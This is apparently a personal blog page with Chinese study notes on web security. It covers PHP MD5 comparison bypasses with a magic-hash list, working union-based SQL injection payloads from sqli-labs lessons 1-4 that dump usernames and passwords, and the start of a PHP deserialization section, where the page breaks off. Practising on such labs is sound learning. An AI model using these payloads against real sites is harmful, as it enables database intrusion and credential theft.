<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="tyc的小窝">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="tyc的小窝">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>tyc的小窝</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">tyc的小窝</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/28/web%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/28/web%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">web安全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-28 17:31:11" itemprop="dateCreated datePublished" datetime="2023-09-28T17:31:11+08:00">2023-09-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:34:26" itemprop="dateModified" datetime="2025-01-10T18:34:26+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="web学习"><a href="#web学习" class="headerlink" title="web学习"></a>web学习</h3><h4 id="一-PHPMD5绕过"><a href="#一-PHPMD5绕过" class="headerlink" title="一.PHPMD5绕过"></a>一.PHPMD5绕过</h4><h5 id="1-“oe”-绕过"><a href="#1-“oe”-绕过" class="headerlink" title="1 “oe” 绕过"></a>1 “oe” 绕过</h5><p>​		因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p>
<p>​		基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s878926199a&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;s155964671a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;--&gt;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// s878926199a--&gt;0e545993274517709034328855841020</span></span><br><span class="line"><span class="comment">// s155964671a--&gt;0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字</span></span><br><span class="line"><span class="variable">$a1</span> = <span class="string">&quot;0e33&quot;</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="string">&quot;0e89&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a1</span> == <span class="variable">$b1</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 字母</span></span><br><span class="line"><span class="variable">$a3</span> = <span class="string">&quot;0eadd&quot;</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a3</span> == <span class="variable">$b3</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字 vs 数字/字母</span></span><br><span class="line"><span class="variable">$a4</span> = <span class="string">&quot;0ea34343dd&quot;</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="string">&quot;0e232&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a4</span> == <span class="variable">$b4</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用</p>
<p>常见的 md5 值是 <code>0e</code> 开头且后面均为数字的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"><span class="number">240610708</span> </span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"><span class="number">314282422</span> </span><br><span class="line"><span class="number">0e990995504821699494520356953734</span></span><br><span class="line"><span class="number">571579406</span> </span><br><span class="line"><span class="number">0e972379832854295224118025748221</span></span><br><span class="line"><span class="number">903251147</span> </span><br><span class="line"><span class="number">0e174510503823932942361353209384</span></span><br><span class="line"><span class="number">1110242161</span> </span><br><span class="line"><span class="number">0e435874558488625891324861198103</span></span><br><span class="line"><span class="number">1320830526</span> </span><br><span class="line"><span class="number">0e912095958985483346995414060832</span></span><br><span class="line"><span class="number">1586264293</span> </span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line"><span class="number">2302756269</span> </span><br><span class="line"><span class="number">0e250566888497473798724426794462</span></span><br><span class="line"><span class="number">2427435592</span> </span><br><span class="line"><span class="number">0e067696952328669732475498472343</span></span><br><span class="line"><span class="number">2653531602</span> </span><br><span class="line"><span class="number">0e877487522341544758028810610885</span></span><br><span class="line"><span class="number">3293867441</span> </span><br><span class="line"><span class="number">0e471001201303602543921144570260</span></span><br><span class="line"><span class="number">3295421201</span> </span><br><span class="line"><span class="number">0e703870333002232681239618856220</span></span><br><span class="line"><span class="number">3465814713</span> </span><br><span class="line"><span class="number">0e258631645650999664521705537122</span></span><br><span class="line"><span class="number">3524854780</span> </span><br><span class="line"><span class="number">0e507419062489887827087815735195</span></span><br><span class="line"><span class="number">3908336290</span> </span><br><span class="line"><span class="number">0e807624498959190415881248245271</span></span><br><span class="line"><span class="number">4011627063</span> </span><br><span class="line"><span class="number">0e485805687034439905938362701775</span></span><br><span class="line"><span class="number">4775635065</span> </span><br><span class="line"><span class="number">0e998212089946640967599450361168</span></span><br><span class="line"><span class="number">4790555361</span> </span><br><span class="line"><span class="number">0e643442214660994430134492464512</span></span><br><span class="line"><span class="number">5432453531</span> </span><br><span class="line"><span class="number">0e512318699085881630861890526097</span></span><br><span class="line"><span class="number">5579679820</span> </span><br><span class="line"><span class="number">0e877622011730221803461740184915</span></span><br><span class="line"><span class="number">5585393579</span> </span><br><span class="line"><span class="number">0e664357355382305805992765337023</span></span><br><span class="line"><span class="number">6376552501</span> </span><br><span class="line"><span class="number">0e165886706997482187870215578015</span></span><br><span class="line"><span class="number">7124129977</span> </span><br><span class="line"><span class="number">0e500007361044747804682122060876</span></span><br><span class="line"><span class="number">7197546197</span> </span><br><span class="line"><span class="number">0e915188576072469101457315675502</span></span><br><span class="line"><span class="number">7656486157</span> </span><br><span class="line"><span class="number">0e451569119711843337267091732412</span></span><br><span class="line">QLTHNDT </span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO </span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI </span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC </span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ </span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI </span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS </span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY </span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY </span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX </span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA </span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL </span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE </span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ </span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ </span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF </span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC </span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV </span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br></pre></td></tr></table></figure>

<h5 id="数组绕过（PHP-8-无法绕过）"><a href="#数组绕过（PHP-8-无法绕过）" class="headerlink" title="数组绕过（PHP 8 无法绕过）"></a>数组绕过（PHP 8 无法绕过）</h5><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /param.php?a[]=1&amp;b[]=2</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(PHP_VERSION . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="md5-碰撞"><a href="#md5-碰撞" class="headerlink" title="md5 碰撞"></a>md5 碰撞</h5><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。<br>新建一个空的 txt 文档。</p>
<p>然后拖到 exe 上，自动生成两个文件。</p>
<p>得到两个文件，通过代码读取即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg1.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg2.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马</p>
<h4 id="二-sqli-labs靶场学习"><a href="#二-sqli-labs靶场学习" class="headerlink" title="二.sqli-labs靶场学习"></a>二.sqli-labs靶场学习</h4><h5 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=1&#x27;				#错误显示</span><br><span class="line">?id=1&#x27;--+			#正常显示，为字符型注入</span><br><span class="line">?id=1&#x27; order by 3 --+	#判断列数</span><br><span class="line">?id=-1 union select 1,2,3		#爆出显示位</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<h5 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#联合注入数字型</span><br><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> #数字型</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<h5 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h5><p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-10-17 170104.png)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>



<h5 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>











<h4 id="三-php反序列化"><a href="#三-php反序列化" class="headerlink" title="三..php反序列化"></a>三..php反序列化</h4><h5 id="1-魔法方法"><a href="#1-魔法方法" class="headerlink" title="1.魔法方法"></a>1.魔法方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()            <span class="comment">//类的构造函数，创建对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()             <span class="comment">//类的析构函数，对象被销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()                 <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ 